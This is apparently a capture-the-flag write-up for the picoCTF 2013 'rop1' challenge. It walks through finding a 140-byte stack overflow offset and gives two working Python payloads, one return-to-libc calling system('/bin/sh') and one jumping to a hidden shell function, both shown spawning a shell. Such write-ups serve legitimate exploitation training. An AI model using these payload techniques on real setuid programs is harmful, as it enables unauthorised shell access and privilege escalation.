### S0lv3d by H4yicl3

First i download source here :https://2013.picoctf.com/problems/rop1-fa6168f4d8eba0eb
then i use IDA to analysis the code
```c
int be_nice_to_people()			//<----function make us have permission run of suid
{
  __gid_t v0; // ST1C_4@1

  v0 = getegid();
  return setresgid(v0, v0, v0);
}
int __cdecl main(int argc, const char **argv, const char **envp)
{
  be_nice_to_people();
  vulnerable_function();
  return write(1, "Hello, World\n", 0xDu);
}
ssize_t vulnerable_function()	
{
  char buf; // [sp+10h] [bp-88h]@1	//<----- overflow this 

  return read(0, &buf, 0x100u);
}
```

the second we need to find eip(return address)
```
-00000088 buf             db ?
+00000004  r              db 4 dup(?)
```
So the offset = 0x88+0x4 =0x8c(hex) = 140

the third we use gdb-peda to checksec
```
gdb-peda$ checksec
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED				<----- the flag NX turned on
PIE       : disabled
RELRO     : Partial
gdb-peda$ 
```

So we can't excute in stack
So we need return to libc to excute system("/bin/sh")
```
gdb-peda$ b *main
gdb-peda$ r
gdb-peda$ p &system
$1 = (<text variable, no debug info> *) 0xf7e4a310 <system>		<---- we have address of system
gdb-peda$ find /bin/sh			
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f6a84c ("/bin/sh")	<----- we have address of /bin/sh
gdb-peda$ 
```

finaly, we write the python script look like:
```python
padding = "A"*140
system_address = "\x10\xa3\xe4\xf7"
return_after_system = "junk"
binsh_address = "\x4c\xa8\xf6\xf7"
print padding + system_address + return_after_system + binsh_address
```

try to run it
```
(python rop1.py;cat)|./rop1 
whoami
hayicle
```

well done!!

but i see 
```
ROP is a classic technique for getting around address randomization and non-executable memory. 
This sequence will teach you the basics.
```

````
The main difference between the overflow problems and ROP is that ROP type problems have NX/ASLR
enabled, and sometimes other protections. This means that libc and stack addresses are random, and 
that no memory is simultaneously writeable and executables.RIP shellcode.

(link from :https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013/rop-1)
```
															
so we need this function not_called
```asm
.text:080484A4 not_called      proc near
.text:080484A4                 push    ebp											  <--- call here
.text:080484A5                 mov     ebp, esp
.text:080484A7                 sub     esp, 18h
.text:080484AA                 mov     dword ptr [esp], offset command ; "/bin/bash"  <--- this doesn't random
.text:080484B1                 call    _system
.text:080484B6                 leave
.text:080484B7                 retn
.text:080484B7 not_called      endp
```

so we need redirect to it !!
now the python script look like
```python
padding = "A"*140
bin_bash = "\xa4\x84\x04\x08"
print padding+bin_bash
```

try run it
```
(python rop1.py ;cat )|./rop1
whoami
hayicle
```

My bad :))